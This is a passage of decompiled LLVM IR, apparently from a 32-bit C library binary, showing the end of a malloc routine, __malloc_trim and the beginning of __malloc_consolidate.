  %v1_80544fc = or i32 %v1_80544f7, 1
  store i32 %v1_80544fc, i32* %edx.global-to-local, align 4
  %v5_80544ff = icmp ult i32 %v1_80544f7, 15
  store i32 %v1_80544fc, i32* %v2_805433f, align 4
  %v0_8054505 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054505 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054505 = add i32 %v0_8054505, 4
  %v3_8054505 = add i32 %v2_8054505, %v1_8054505
  %v4_8054505 = inttoptr i32 %v3_8054505 to i32*
  store i32 5, i32* %v4_8054505, align 4
  %v0_805450d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805450d = load i32, i32* %eax.global-to-local, align 4
  %v2_805450d = add i32 %v0_805450d, 8
  %v3_805450d = add i32 %v2_805450d, %v1_805450d
  %v4_805450d = inttoptr i32 %v3_805450d to i32*
  store i32 5, i32* %v4_805450d, align 4
  br i1 %v5_80544ff, label %dec_label_pc_805453e, label %dec_label_pc_8054517

dec_label_pc_8054517:                             ; preds = %dec_label_pc_80544f0
  %v0_8054517 = load i32, i32* @global_var_8065b44.975, align 4
  store i32 %v0_8054517, i32* @ebx, align 4
  %v0_805451d = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054522 = add i32 %v0_805451d, 8
  store i32 %v1_8054522, i32* %eax.global-to-local, align 4
  store i32 %v1_8054522, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8065b44.975, align 4
  %v1_8054530 = call i32 @free(i32 %v1_8054522)
  store i32 %v1_8054530, i32* %eax.global-to-local, align 4
  %v0_8054538 = load i32, i32* @ebx, align 4
  store i32 %v0_8054538, i32* @global_var_8065b44.975, align 4
  br label %dec_label_pc_805453e

dec_label_pc_805453e:                             ; preds = %dec_label_pc_80544f0, %dec_label_pc_80544d5, %dec_label_pc_80544d0, %dec_label_pc_80543ff, %dec_label_pc_8054517
  %v0_805453e = load i32, i32* @global_var_8065b68.971, align 8
  %v0_8054543 = load i32, i32* @global_var_8065b6c.976, align 4
  %v0_805454f = load i32, i32* @global_var_806582c.959, align 4
  store i32 %v0_805454f, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_805453e, %v0_8054543
  %v5_8054555 = select i1 %tmp89, i32 %v0_8054543, i32 %v0_805453e
  store i32 %v5_8054555, i32* @edx, align 4
  %v1_8054558 = load i32, i32* @global_var_8065b64.970, align 4
  %v2_8054558 = add i32 %v1_8054558, %v0_805453e
  store i32 %v5_8054555, i32* @global_var_8065b6c.976, align 4
  %v1_8054564 = load i32, i32* @global_var_8065b74.972, align 4
  %tmp90 = icmp ule i32 %v2_8054558, %v1_8054564
  %v5_805456a = select i1 %tmp90, i32 %v1_8054564, i32 %v2_8054558
  store i32 %v5_805456a, i32* %eax.global-to-local, align 4
  store i32 %v5_805456a, i32* @global_var_8065b74.972, align 4
  %v1_8054576 = add i32 %v0_805454f, 4
  %v2_8054576 = inttoptr i32 %v1_8054576 to i32*
  %v3_8054576 = load i32, i32* %v2_8054576, align 4
  %v1_8054579 = and i32 %v3_8054576, -4
  store i32 %v1_8054579, i32* @ecx, align 4
  %v10_805457c = icmp ult i32 %v1_8054579, %v1_80541f6
  br i1 %v10_805457c, label %dec_label_pc_80545fc, label %dec_label_pc_8054582

dec_label_pc_8054582:                             ; preds = %dec_label_pc_805453e
  store i32 %v1_805427e, i32* %esi.global-to-local, align 4
  %v2_8054588 = sub i32 %v1_8054579, %v1_805427e
  store i32 %v2_8054588, i32* %ecx.global-to-local, align 4
  %v2_805458a = add i32 %v0_805454f, %v1_805427e
  store i32 %v2_805458a, i32* @edx, align 4
  %v1_805458d = or i32 %v1_805427e, 1
  store i32 %v1_805458d, i32* %eax.global-to-local, align 4
  store i32 %v2_805458a, i32* @global_var_806582c.959, align 4
  store i32 %v1_805458d, i32* %v2_8054576, align 4
  %v0_8054599.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054599

dec_label_pc_8054599:                             ; preds = %dec_label_pc_8054204, %dec_label_pc_8054582
  %v0_8054599 = phi i32 [ %v5_8054217, %dec_label_pc_8054204 ], [ %v0_8054599.pre, %dec_label_pc_8054582 ]
  %v1_8054599 = or i32 %v0_8054599, 1
  store i32 %v1_8054599, i32* @ecx, align 4
  %v0_805459c = load i32, i32* @ebx, align 4
  %v1_805459c = add i32 %v0_805459c, 8
  store i32 %v1_805459c, i32* %ebx.global-to-local, align 4
  %v1_805459f = load i32, i32* @edx, align 4
  %v2_805459f = add i32 %v1_805459f, 4
  %v3_805459f = inttoptr i32 %v2_805459f to i32*
  store i32 %v1_8054599, i32* %v3_805459f, align 4
  br label %dec_label_pc_8054609

dec_label_pc_80545a4:                             ; preds = %dec_label_pc_8053fb6
  %v5_80545aa = sub i32 %v1_8053f99, %v1_805427e
  store i32 %v5_80545aa, i32* %eax.global-to-local, align 4
  %v2_80545ae = add i32 %v0_8054064118, %v1_805427e
  store i32 %v2_80545ae, i32* @edx, align 4
  %v1_80545b2 = or i32 %v1_805427e, 1
  store i32 %v2_80545ae, i32* @global_var_8065830.960, align 16
  store i32 %v1_80545b2, i32* %v2_8053f93, align 4
  %v0_80545be = load i32, i32* %eax.global-to-local, align 4
  %v1_80545c0 = or i32 %v0_80545be, 1
  store i32 %v1_80545c0, i32* @ecx, align 4
  %v0_80545c3 = load i32, i32* @edx, align 4
  store i32 %v0_80545c3, i32* @global_var_806583c.977, align 4
  store i32 %v0_80545c3, i32* @global_var_8065840.962, align 64
  %v1_80545cf = add i32 %v0_80545c3, 8
  %v2_80545cf = inttoptr i32 %v1_80545cf to i32*
  store i32 ptrtoint (i32* @global_var_8065834.961 to i32), i32* %v2_80545cf, align 4
  %v0_80545d6 = load i32, i32* @edx, align 4
  %v1_80545d6 = add i32 %v0_80545d6, 12
  %v2_80545d6 = inttoptr i32 %v1_80545d6 to i32*
  store i32 ptrtoint (i32* @global_var_8065834.961 to i32), i32* %v2_80545d6, align 4
  %v0_80545dd = load i32, i32* @ecx, align 4
  %v1_80545dd = load i32, i32* @edx, align 4
  %v2_80545dd = add i32 %v1_80545dd, 4
  %v3_80545dd = inttoptr i32 %v2_80545dd to i32*
  store i32 %v0_80545dd, i32* %v3_80545dd, align 4
  %v0_80545e0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80545e0 = load i32, i32* @edx, align 4
  %v3_80545e0 = add i32 %v1_80545e0, %v0_80545e0
  %v4_80545e0 = inttoptr i32 %v3_80545e0 to i32*
  store i32 %v0_80545e0, i32* %v4_80545e0, align 4
  br label %dec_label_pc_80545ee

dec_label_pc_80545e5:                             ; preds = %dec_label_pc_8053fc5
  store i32 %v1_805427e, i32* %ebx.global-to-local, align 4
  %v0_80545e9 = load i32, i32* @ebp, align 4
  %v2_80545e9 = or i32 %v1_805427e, 4
  %v3_80545e9 = add i32 %v0_80545e9, %v2_80545e9
  %v4_80545e9 = inttoptr i32 %v3_80545e9 to i32*
  %v5_80545e9 = load i32, i32* %v4_80545e9, align 4
  %v6_80545e9 = or i32 %v5_80545e9, 1
  store i32 %v6_80545e9, i32* %v4_80545e9, align 4
  br label %dec_label_pc_80545ee

dec_label_pc_80545ee:                             ; preds = %dec_label_pc_80545a4, %dec_label_pc_80545e5
  %v0_80545ee = load i32, i32* @ebp, align 4
  %v1_80545ee = add i32 %v0_80545ee, 8
  store i32 %v1_80545ee, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054609

dec_label_pc_80545f3:                             ; preds = %dec_label_pc_80540b5
  %v1_80545f3 = load i32, i32* @ebx, align 4
  %v2_80545f3 = add i32 %v0_80540c1, 4
  %v3_80545f3 = add i32 %v2_80545f3, %v1_80545f3
  %v4_80545f3 = inttoptr i32 %v3_80545f3 to i32*
  %v5_80545f3 = load i32, i32* %v4_80545f3, align 4
  %v6_80545f3 = or i32 %v5_80545f3, 1
  store i32 %v6_80545f3, i32* %v4_80545f3, align 4
  br label %dec_label_pc_80545f8

dec_label_pc_80545f8:                             ; preds = %dec_label_pc_80540cd, %dec_label_pc_80545f3
  %v0_80545f8 = load i32, i32* @ecx, align 4
  store i32 %v0_80545f8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054609

dec_label_pc_80545fc:                             ; preds = %dec_label_pc_805439f, %dec_label_pc_805453e, %dec_label_pc_80543e1, %dec_label_pc_80543b7
  %v0_80545fc = load i32, i32* %stack_var_-92, align 4
  %v1_80545fc = call i32 @__errno_location(i32 %v0_80545fc)
  store i32 %v1_80545fc, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8054603 = inttoptr i32 %v1_80545fc to i32*
  store i32 12, i32* %v1_8054603, align 4
  br label %dec_label_pc_8054609

dec_label_pc_8054609:                             ; preds = %dec_label_pc_80545f8, %dec_label_pc_80545ee, %dec_label_pc_8054599, %dec_label_pc_805422f, %dec_label_pc_80541e1, %dec_label_pc_8053f60, %dec_label_pc_80545fc
  store i32 %v2_8053e97, i32* @eax, align 4
  store i32 %v2_8053e97, i32* %stack_var_-92, align 4
  %v2_8054612 = call i32 @__pthread_return_void(i32 %v2_8053e97, i32 1)
  store i32 %v2_8054612, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805461a

dec_label_pc_805461a:                             ; preds = %dec_label_pc_8053eb5, %dec_label_pc_8054609
  %v0_805461d = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805461d, i32* %eax.global-to-local, align 4
  %v2_805461f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805461f, i32* @ebx, align 4
  store i32 %v0_8053e84, i32* @esi, align 4
  store i32 %v0_8053e83, i32* @edi, align 4
  store i32 %v0_8053e82, i32* @ebp, align 4
  ret i32 %v0_805461d

; uselistorder directives
  uselistorder i32 %v0_80545e0, { 1, 0 }
  uselistorder i32 %v1_8054564, { 1, 0 }
  uselistorder i32 %v2_8054558, { 1, 0 }
  uselistorder i32 %v0_8054543, { 1, 0 }
  uselistorder i32 %v0_805453e, { 0, 2, 1 }
  uselistorder i32 %v1_80544d5, { 1, 0, 2 }
  uselistorder i32 %v0_80544d5, { 1, 0 }
  uselistorder i32 %v2_80544c3, { 1, 0 }
  uselistorder i32 %v1_805447a, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8054468, { 1, 0, 2 }
  uselistorder i32 %v2_8054458, { 1, 2, 0 }
  uselistorder i32 %v2_8054453, { 1, 0, 2 }
  uselistorder i32 %v1_8054443, { 2, 1, 0 }
  uselistorder i8 %v0_8054411, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80543f4, { 1, 0, 2 }
  uselistorder i32 %v0_80544b6, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_80544a8, { 2, 0, 1 }
  uselistorder i32 %v8_80543c4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_80543aa, { 1, 0, 2 }
  uselistorder i32 %v3_80543aa, { 1, 0 }
  uselistorder i32 %v1_8054378, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805436c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8054368, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8054356, { 1, 0 }
  uselistorder i32 %v1_8054346, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_8054336, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_805431f, { 1, 0 }
  uselistorder i32 %v2_8054313, { 1, 0 }
  uselistorder i32 %v2_8054303, { 0, 3, 1, 2 }
  uselistorder i32 %v2_80542e7, { 1, 2, 0 }
  uselistorder i32 %v1_80542e7, { 1, 0, 2 }
  uselistorder i32 %v1_80542e6, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_80542e0, { 1, 0 }
  uselistorder i32 %v2_80542be, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80542b2, { 2, 1, 0 }
  uselistorder i32 %v8_805429d, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8054284, { 1, 0, 2 }
  uselistorder i32 %v0_8054227, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80541f6, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80541e9, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_80541cf, { 1, 0, 2 }
  uselistorder i32 %v1_8054169, { 1, 0 }
  uselistorder i32 %v3_805415e, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8054158, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805415512, { 1, 0 }
  uselistorder i32 %v2_805414a, { 1, 0 }
  uselistorder i32 %v1_805412e, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_805412a, { 2, 1, 0 }
  uselistorder i32 %v1_8054126, { 1, 0 }
  uselistorder i32 %v1_8054121, { 2, 1, 0 }
  uselistorder i32 %v2_8054110, { 1, 0 }
  uselistorder i32 %v1_805410d, { 1, 2, 0, 3 }
  uselistorder i32 %v4_80540ab, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_80540f6, { 1, 0 }
  uselistorder i32 %v0_80540c1, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8054097, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8054064, { 0, 2, 1 }
  uselistorder i32 %v2_8054048, { 1, 0 }
  uselistorder i32 %v1_805403e, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8054039.lcssa, { 1, 0 }
  uselistorder i32 %v3_8054029, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8054020, { 1, 0, 2 }
  uselistorder i32 %v3_8054003, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_8053ffc, { 1, 0, 2 }
  uselistorder i32 %v2_8053fe4, { 2, 1, 0 }
  uselistorder i32 %v0_8053fd0, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8053f96, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8054064118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8054064109, { 1, 0, 2 }
  uselistorder i32 %v3_8053f43, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8053f35, { 2, 1, 0 }
  uselistorder i32 %v2_8053f10, { 2, 1, 0 }
  uselistorder i8 %v0_8053ede, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_805427e, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_8053ec7, { 1, 2, 0 }
  uselistorder i32 %v0_8053eb0, { 1, 0 }
  uselistorder i32 %v2_8053e97, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 0, 12, 13, 15, 16, 17, 18, 1, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i8 -2, { 0, 1, 3, 2, 4 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8065b60.974, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134633524, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8065840.962, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_806582c.959 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_806582c.959 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_805461a, { 1, 0 }
  uselistorder label %dec_label_pc_8054609, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80545fc, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80545f8, { 1, 0 }
  uselistorder label %dec_label_pc_80545ee, { 1, 0 }
  uselistorder label %dec_label_pc_8054599, { 1, 0 }
  uselistorder label %dec_label_pc_805453e, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80544d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80544cb, { 1, 0 }
  uselistorder label %dec_label_pc_80544af, { 1, 0 }
  uselistorder label %dec_label_pc_8054458, { 1, 0 }
  uselistorder label %dec_label_pc_8054441, { 1, 0 }
  uselistorder label %dec_label_pc_805442a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80543e1, { 1, 0 }
  uselistorder label %dec_label_pc_805439f, { 1, 0 }
  uselistorder label %dec_label_pc_8054336, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80542d5, { 1, 0 }
  uselistorder label %dec_label_pc_80541e9, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80541e1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054155, { 1, 0 }
  uselistorder label %dec_label_pc_805415a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805412e, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80540b5, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_805403c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8054025, { 1, 0 }
  uselistorder label %dec_label_pc_8053f93, { 1, 0 }
  uselistorder label %dec_label_pc_8054064.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053f60, { 1, 0 }
  uselistorder label %dec_label_pc_8053ede, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8054625 = load i32, i32* @edx, align 4
  store i32 %v0_8054625, i32* %ebp.global-to-local, align 4
  %v0_8054628 = load i32, i32* @esi, align 4
  %v1_805462d = add i32 %v0_8054625, 860
  %v2_805462d = inttoptr i32 %v1_805462d to i32*
  %v3_805462d = load i32, i32* %v2_805462d, align 4
  store i32 %v3_805462d, i32* @ecx, align 4
  %v1_8054633 = add i32 %v0_8054625, 44
  %v2_8054633 = inttoptr i32 %v1_8054633 to i32*
  %v3_8054633 = load i32, i32* %v2_8054633, align 4
  %v1_8054636 = add i32 %v3_8054633, 4
  %v2_8054636 = inttoptr i32 %v1_8054636 to i32*
  %v3_8054636 = load i32, i32* %v2_8054636, align 4
  %v1_8054639 = and i32 %v3_8054636, -4
  store i32 %v1_8054639, i32* @esi, align 4
  %v1_805463e = load i32, i32* @eax, align 4
  %v2_805463e = add i32 %v3_805462d, -17
  %v2_8054640 = add i32 %v2_805463e, %v1_8054639
  %v3_8054640 = sub i32 %v2_8054640, %v1_805463e
  %div = udiv i32 %v3_8054640, %v3_805462d
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8054640, %v3_805462d
  store i32 %tmp10, i32* @edx, align 4
  %v1_8054648 = add i32 %div, -1
  %v4_805464b = mul i32 %v1_8054648, %v3_805462d
  store i32 %v4_805464b, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805464b, 1
  br i1 %tmp11, label %dec_label_pc_80546a7, label %dec_label_pc_8054652

dec_label_pc_8054652:                             ; preds = %entry
  %v1_8054657 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8054657, i32* %edi.global-to-local, align 4
  %v0_8054661 = load i32, i32* @esi, align 4
  store i32 %v0_8054661, i32* %eax.global-to-local, align 4
  %v1_8054663 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054663 = add i32 %v1_8054663, 44
  %v3_8054663 = inttoptr i32 %v2_8054663 to i32*
  %v4_8054663 = load i32, i32* %v3_8054663, align 4
  %v5_8054663 = add i32 %v4_8054663, %v0_8054661
  store i32 %v5_8054663, i32* %eax.global-to-local, align 4
  %v12_8054666 = icmp eq i32 %v1_8054657, %v5_8054663
  %v1_8054668 = icmp eq i1 %v12_8054666, false
  br i1 %v1_8054668, label %dec_label_pc_80546a7, label %dec_label_pc_805466a

dec_label_pc_805466a:                             ; preds = %dec_label_pc_8054652
  %v1_805466d = sub i32 0, %v4_805464b
  store i32 %v1_805466d, i32* @ebx, align 4
  %v1_8054670 = call i32 @__GI_sbrk(i32 %v1_805466d)
  store i32 %v1_8054670, i32* %eax.global-to-local, align 4
  %v1_805467c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805467c, i32* %eax.global-to-local, align 4
  %v10_8054684 = icmp eq i32 %v1_805467c, -1
  br i1 %v10_8054684, label %dec_label_pc_80546a7, label %dec_label_pc_8054689

dec_label_pc_8054689:                             ; preds = %dec_label_pc_805466a
  %v0_8054689 = load i32, i32* %edi.global-to-local, align 4
  %v2_805468b = sub i32 %v0_8054689, %v1_805467c
  %v12_805468b = icmp eq i32 %v2_805468b, 0
  store i32 %v2_805468b, i32* @ecx, align 4
  br i1 %v12_805468b, label %dec_label_pc_80546a7, label %dec_label_pc_805468f

dec_label_pc_805468f:                             ; preds = %dec_label_pc_8054689
  %v0_805468f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805468f = add i32 %v0_805468f, 44
  %v2_805468f = inttoptr i32 %v1_805468f to i32*
  %v3_805468f = load i32, i32* %v2_805468f, align 4
  store i32 %v3_805468f, i32* %eax.global-to-local, align 4
  %v0_8054692 = load i32, i32* @esi, align 4
  %v2_8054692 = sub i32 %v0_8054692, %v2_805468b
  store i32 %v2_8054692, i32* %esi.global-to-local, align 4
  %v1_8054694 = add i32 %v0_805468f, 872
  %v2_8054694 = inttoptr i32 %v1_8054694 to i32*
  %v3_8054694 = load i32, i32* %v2_8054694, align 4
  %v5_8054694 = sub i32 %v3_8054694, %v2_805468b
  store i32 %v5_8054694, i32* %v2_8054694, align 4
  %v0_805469a = load i32, i32* %esi.global-to-local, align 4
  %v1_805469a = or i32 %v0_805469a, 1
  store i32 %v1_805469a, i32* %esi.global-to-local, align 4
  %v1_805469d = load i32, i32* %eax.global-to-local, align 4
  %v2_805469d = add i32 %v1_805469d, 4
  %v3_805469d = inttoptr i32 %v2_805469d to i32*
  store i32 %v1_805469a, i32* %v3_805469d, align 4
  br label %dec_label_pc_80546a9

dec_label_pc_80546a7:                             ; preds = %dec_label_pc_8054689, %dec_label_pc_805466a, %dec_label_pc_8054652, %entry
  br label %dec_label_pc_80546a9

dec_label_pc_80546a9:                             ; preds = %dec_label_pc_805468f, %dec_label_pc_80546a7
  %storemerge = phi i32 [ 1, %dec_label_pc_805468f ], [ 0, %dec_label_pc_80546a7 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8054628, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805467c, { 1, 0, 2 }
  uselistorder i32 %v4_805464b, { 1, 2, 0 }
  uselistorder i32 %v3_805462d, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_8054625, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80546a9, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_80546b2 = load i32, i32* @edi, align 4
  %v0_80546b3 = load i32, i32* @esi, align 4
  %v0_80546b4 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80546bc = load i32, i32* %arg1, align 4
  store i32 %v2_80546bc, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80546c3 = icmp eq i32 %v2_80546bc, 0
  br i1 %v1_80546c3, label %dec_label_pc_80547ec.preheader, label %dec_label_pc_80546cb

dec_label_pc_80547ec.preheader:                   ; preds = %entry
  %v3_80547e1 = add i32 %tmp11, 44
  br label %dec_label_pc_80547dd

dec_label_pc_80546cb:                             ; preds = %entry
  %v1_80546cf = and i32 %v2_80546bc, -3
  store i32 %v1_80546cf, i32* %arg1, align 4
  %v1_80546d4 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_80546e3 = add i32 %tmp11, 4
  store i32 %v1_80546e3, i32* %eax.global-to-local, align 4
  %v2_80546ea = load i32, i32* %arg1, align 4
  %v2_80546f0 = udiv i32 %v2_80546ea, 8
  %v2_80546f3 = mul nuw i32 %v2_80546f0, 4
  %v3_80546f3 = add i32 %tmp11, -4
  %v4_80546f3 = add i32 %v3_80546f3, %v2_80546f3
  store i32 %v4_80546f3, i32* %eax.global-to-local, align 4
  %v2_80547ba = add i32 %tmp11, 44
  %v3_80547ba = inttoptr i32 %v2_80547ba to i32*
  %v1_805478d = add i32 %tmp11, 60
  %v2_805478d = inttoptr i32 %v1_805478d to i32*
  br label %dec_label_pc_80546fb

dec_label_pc_80546fb:                             ; preds = %dec_label_pc_80547d3, %dec_label_pc_80546cb
  %v0_8054709 = phi i32 [ %v1_80546e3, %dec_label_pc_80546cb ], [ %v4_80547d3, %dec_label_pc_80547d3 ]
  store i32 %v0_8054709, i32* %eax.global-to-local, align 4
  %v1_80546ff = inttoptr i32 %v0_8054709 to i32*
  %v2_80546ff = load i32, i32* %v1_80546ff, align 4
  store i32 %v2_80546ff, i32* @ecx, align 4
  %v1_8054701 = icmp eq i32 %v2_80546ff, 0
  br i1 %v1_8054701, label %dec_label_pc_80547c9, label %dec_label_pc_8054709

dec_label_pc_8054709:                             ; preds = %dec_label_pc_80546fb
  store i32 0, i32* %v1_80546ff, align 4
  %v0_805470f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805470f

dec_label_pc_805470f:                             ; preds = %dec_label_pc_80547bd, %dec_label_pc_8054709
  %v0_805472c = phi i32 [ %v3_805470f, %dec_label_pc_80547bd ], [ %v0_805470f.pre, %dec_label_pc_8054709 ]
  %v1_805470f = add i32 %v0_805472c, 8
  %v2_805470f = inttoptr i32 %v1_805470f to i32*
  %v3_805470f = load i32, i32* %v2_805470f, align 4
  store i32 %v3_805470f, i32* %edx.global-to-local, align 4
  %v1_8054716 = add i32 %v0_805472c, 4
  %v2_8054716 = inttoptr i32 %v1_8054716 to i32*
  %v3_8054716 = load i32, i32* %v2_8054716, align 4
  store i32 %v3_8054716, i32* %eax.global-to-local, align 4
  %v1_805471b = and i32 %v3_8054716, -2
  store i32 %v1_805471b, i32* @edi, align 4
  %v2_805471e = urem i32 %v3_8054716, 2
  %v3_805471e = icmp eq i32 %v2_805471e, 0
  %v2_8054720 = add i32 %v1_805471b, %v0_805472c
  store i32 %v2_8054720, i32* @ebx, align 4
  %v1_8054723 = add i32 %v2_8054720, 4
  %v2_8054723 = inttoptr i32 %v1_8054723 to i32*
  %v3_8054723 = load i32, i32* %v2_8054723, align 4
  store i32 %v3_8054723, i32* %edx.global-to-local, align 4
  %v1_805472a = icmp eq i1 %v3_805471e, false
  br i1 %v1_805472a, label %dec_label_pc_805474c, label %dec_label_pc_805472c

dec_label_pc_805472c:                             ; preds = %dec_label_pc_805470f
  %v1_805472c = inttoptr i32 %v0_805472c to i32*
  %v2_805472c = load i32, i32* %v1_805472c, align 4
  store i32 %v2_805472c, i32* %ebp.global-to-local, align 4
  %v2_8054730 = sub i32 %v0_805472c, %v2_805472c
  store i32 %v2_8054730, i32* %eax.global-to-local, align 4
  %v1_8054732 = add i32 %v2_8054730, 8
  %v2_8054732 = inttoptr i32 %v1_8054732 to i32*
  %v3_8054732 = load i32, i32* %v2_8054732, align 4
  store i32 %v3_8054732, i32* @esi, align 4
  %v1_8054735 = add i32 %v2_8054730, 12
  %v2_8054735 = inttoptr i32 %v1_8054735 to i32*
  %v3_8054735 = load i32, i32* %v2_8054735, align 4
  store i32 %v3_8054735, i32* %edx.global-to-local, align 4
  %v1_8054738 = add i32 %v3_8054732, 12
  %v2_8054738 = inttoptr i32 %v1_8054738 to i32*
  %v3_8054738 = load i32, i32* %v2_8054738, align 4
  store i32 %v3_8054738, i32* @ecx, align 4
  %v12_805473b = icmp eq i32 %v3_8054738, %v2_8054730
  %v1_805473d = icmp eq i1 %v12_805473b, false
  br i1 %v1_805473d, label %dec_label_pc_805477c, label %dec_label_pc_805473f

dec_label_pc_805473f:                             ; preds = %dec_label_pc_805472c
  %v1_805473f = add i32 %v3_8054735, 8
  %v2_805473f = inttoptr i32 %v1_805473f to i32*
  %v3_805473f = load i32, i32* %v2_805473f, align 4
  %v15_805473f = icmp eq i32 %v3_805473f, %v3_8054738
  %v1_8054742 = icmp eq i1 %v15_805473f, false
  br i1 %v1_8054742, label %dec_label_pc_805477c, label %dec_label_pc_8054744

